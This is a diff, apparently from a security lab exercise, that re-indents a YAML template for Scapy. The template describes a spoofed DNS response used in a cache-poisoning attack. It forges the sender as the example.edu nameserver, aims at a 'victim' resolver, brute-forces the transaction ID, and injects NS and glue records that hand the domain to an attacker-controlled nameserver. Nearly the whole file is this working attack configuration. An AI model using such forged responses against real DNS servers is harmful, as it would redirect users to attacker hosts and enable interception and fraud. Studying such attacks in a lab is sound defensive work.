@@ -1,37 +1,37 @@
 send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight=sniff#scapy.sendrecv.send
     packets: # Scapy calls this 'x'
         - IP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.IP.fields_desc
-          dst: "192.168.15.4" # Apollo / victim dns server
-          src: "199.43.133.53" # example.edu nameserver
-          UDP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.UDP
-            sport: 53 # DNS port
-            dport: 33333 # 33333 is hardcoded setup port
-            DNS: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNS
-              id: "python:__import__('random').randint(0, 0xffff)" # Need to brute force this
-              qr: 1 # Response
-              qdcount: 1
-              ancount: 1
-              nscount: 1
-              arcount: 1
-              qd:
-                qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
-                qtype: "A" # A
-                qclass: "IN" # IN
-              an:
-                rrname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
-                type: "A"
-                rclass: "IN"
-                rdata: "172.22.0.5" # Attacker controlled dns
-              ns:
-                rrname: "example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
-                type: "NS" # NS
-                rclass: "IN"
-                ttl: 86400
-                rdata: "ns.dnslabattacker.net" # Attacker controlled dns name
-              ar:
-                rrname: "ns.dnslabattacker.net" # Attacker controlled dns name
-                type: "A"
-                rclass: "IN"
-                ttl: 86400
-                rdata: "172.22.0.5" # Attacker controlled dns
+            dst: "192.168.15.4" # Apollo / victim dns server
+            src: "199.43.133.53" # example.edu nameserver
+            UDP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.UDP
+              sport: 53 # DNS port
+              dport: 33333 # 33333 is hardcoded setup port
+              DNS: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNS
+                id: "python:__import__('random').randint(0, 0xffff)" # Need to brute force this
+                qr: 1 # Response
+                qdcount: 1
+                ancount: 1
+                nscount: 1
+                arcount: 1
+                qd:
+                  qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
+                  qtype: "A" # A
+                  qclass: "IN" # IN
+                an:
+                  rrname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
+                  type: "A"
+                  rclass: "IN"
+                  rdata: "172.22.0.5" # Attacker controlled dns
+                ns:
+                  rrname: "example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
+                  type: "NS" # NS
+                  rclass: "IN"
+                  ttl: 86400
+                  rdata: "ns.dnslabattacker.net" # Attacker controlled dns name
+                ar:
+                  rrname: "ns.dnslabattacker.net" # Attacker controlled dns name
+                  type: "A"
+                  rclass: "IN"
+                  ttl: 86400
+                  rdata: "172.22.0.5" # Attacker controlled dns
     iface: "eth0"
